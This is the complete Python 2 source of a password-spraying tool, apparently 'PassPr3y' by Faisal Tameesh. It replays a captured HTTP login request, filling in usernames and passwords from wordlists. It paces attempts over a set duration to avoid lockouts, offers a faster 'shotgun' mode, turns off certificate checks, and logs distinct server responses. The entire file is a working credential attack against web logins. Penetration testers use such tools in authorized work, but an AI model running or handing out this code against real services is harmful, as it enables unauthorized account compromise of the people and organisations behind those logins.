#!/usr/bin/python

# This program comes with no promises, warranties, or apologies. 
# Use at your own risk and responsibility.

import argparse
import requests
import os
import sys
import time
import hashlib

# Get rid of dem warnings, this a gottam hak tool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Console colors
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white

# Parse command line arguments

parser = argparse.ArgumentParser()

parser.add_argument("--ssl", action="store_true", help="Use https.")
parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
#parser.add_argument("--proxy", help="Specify proxy. Format 'http://127.0.0.1:8080'")
parser.add_argument("--duration", default="7200", help="Total spray duration in seconds. Default is 7200 seconds.")
parser.add_argument("--request", default="request.txt", help="Name of request file. Default is 'request.txt'.")
parser.add_argument("--usernames", default="usernames.txt", help="Name of usernames file. Default is 'usernames.txt'.")
parser.add_argument("--passwords", default="passwords.txt", help="Name of passwords file. Default is 'passwords.txt'.")

args = parser.parse_args()

programheader = """
__________                      __________       ________
\______   \_____    ______ _____\______   \______\_____  \___.__.
 |     ___/\__  \  /  ___//  ___/|     ___/\_  __ \_(__  <   |  |
 |    |     / __ \_\___ \ \___ \ |    |     |  | \%s/       \___  |
 |____|    (____  /____  >____  >|____|     |__| /______  / ____|
                \/     \/     \/                        \/\/

%s\tBrought to you by Faisal Tameesh (%s@DreadSystems%s)
\tShoutout to the folks at %s@DepthSecurity%s
"""%(R,W,R,W,B,W)

print "\n" + "-"*65
print programheader
print "-"*65 + "\n"

# Supporting variables/work
# proxies = {'http' : 'http://10.10.110.100:8080'}
sleepTimeSeconds = int(args.duration)
if not os.path.exists("logs"):
    os.makedirs("logs")

# Ensure spray time is appropriate
if raw_input("You will be spraying every " \
        + str(sleepTimeSeconds) + " seconds in total. Is that cool? (y/N) ").lower() != 'y':
    sys.exit("Change spray time.")

if(args.shotgun):
    if raw_input("You've selected the shotgun method. This will spray ALL users without pausing between each user. Opsec is questionable. Is that cool? (y/N) ").lower() != 'y':
        sys.exit("Don't set shotgun flag.")

################################################################################


# Parse request file
requestsFile = open(args.request, 'r')
lineList = requestsFile.readlines()
endPoint = lineList[0].split(' ')[1].strip()
headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
requestsFile.close()
if("USERPR3Y" not in dataDict.values() or "PASSPR3Y" not in dataDict.values()):
    sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")

# Parse usernames file
usernamesFile = open(args.usernames, 'r')
usernamesList = map(str.strip, usernamesFile.readlines())
usernamesFile.close()

# Parse passwords file
passwordsFile = open(args.passwords, 'r')
passwordsList = map(str.strip, passwordsFile.readlines())
passwordsFile.close()

# Prepare injection points
usernameKey = ""
passwordKey = ""
for key,value in dataDict.iteritems():
    if value == "USERPR3Y":
        usernameKey = key
    elif value == "PASSPR3Y":
        passwordKey = key

# Spray
for password in passwordsList:

    # Get time right before spray
    date = time.strftime("%m.%d.%Y", time.localtime())
    tyme = time.strftime("%H:%M:%S", time.localtime())

    responseDict = {}

    print "Password " + str(passwordsList.index(password) + 1) + " of " + str(len(passwordsList))
    # Perform spray
    for username in usernamesList:
        # Load injection points
        dataDict[usernameKey] = username
        dataDict[passwordKey] = password
        
        # Attempt login
        print "\tAttempting " + username + ':' + password
        if(args.ssl):
            url = "https://" + headerDict["Host"] + endPoint
        else:
            url = "http://" + headerDict["Host"] + endPoint
        #response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
        response = requests.post(url=url, headers=headerDict, data=dataDict, verify=False)

        # Create hash of response
        checksummer = hashlib.md5()
        checksummer.update(response.content)

        # Store hash of response. Chance of collision but very minimal.
        responseDict[checksummer.hexdigest()] = response

        if(not args.shotgun and (password != passwordsList[-1] or username != usernamesList[-1])):
            sleepTime = float(sleepTimeSeconds)/float(len(usernamesList))
            time.sleep(sleepTime)

    # Indicate number of unique responses (still basic approach)
    print "\t\tUnique responses: " + str(len(responseDict))

    # Create file
    if not os.path.exists("logs/" + date):
        os.makedirs("logs/" + date)
    if not os.path.exists("logs/" + date + '/' + tyme):
        os.makedirs("logs/" + date + '/' + tyme)

    # Write to file. Files are named with hashes that distinguish between unique responses.
    for key,value in responseDict.iteritems():
        fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')

        # Log request. If there were redirects, log the very first request made.
        fileOut.write('-'*80 + '\n')
        fileOut.write("REQUEST")
        fileOut.write('\n' + '-'*80 + '\n')

        requestToLog = requests.Request()
        if(value.history):
            requestToLog = value.history[0].request
        else:
            requestToLog = value.request

        fileOut.write(str(requestToLog.url) + '\n\n')
        for k2,v2 in requestToLog.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + str(requestToLog.body) + '\n')

        fileOut.write('\n' + '-'*80 + '\n')
        fileOut.write("RESPONSE")
        fileOut.write('\n' + '-'*80 + '\n')

        # Log response
        fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
        for k2,v2 in value.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + value.text)

        fileOut.close()

    if(args.shotgun and password is not passwordsList[-1]):
        time.sleep(sleepTimeSeconds)
